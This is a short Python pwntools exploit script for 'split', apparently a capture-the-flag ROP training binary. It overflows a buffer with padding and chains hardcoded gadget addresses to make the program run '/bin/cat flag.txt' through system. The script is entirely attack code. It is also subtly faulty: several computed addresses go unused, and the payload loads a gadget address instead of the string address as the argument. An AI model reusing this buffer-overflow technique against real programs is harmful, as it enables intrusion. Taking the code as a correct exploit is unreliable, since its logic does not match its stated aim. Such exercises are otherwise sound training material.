#!/usr/bin/env python3

# Exploit script for split

from pwn import *


elf = context.binary = ELF('./split')
string_addr = p64(next(elf.search(b'/bin/cat flag.txt')))
rop = ROP(elf)

system_addr = elf.symbols['system']

str_addr = next(elf.search(b'/bin/cat flag.txt'))
rop_addr = rop.find_gadget(['pop rdi', 'ret'])[0]

io = process('./split')

io.recvuntil(b'> ')

payload = flat([
	b'A'*40,
	p64(0x00000000004007c3),
	p64(0x00000000004007c3),
	p64(0x000000000040074b)
	])
print(payload)
io.sendline(payload)
print(io.recvline().decode())

io.interactive()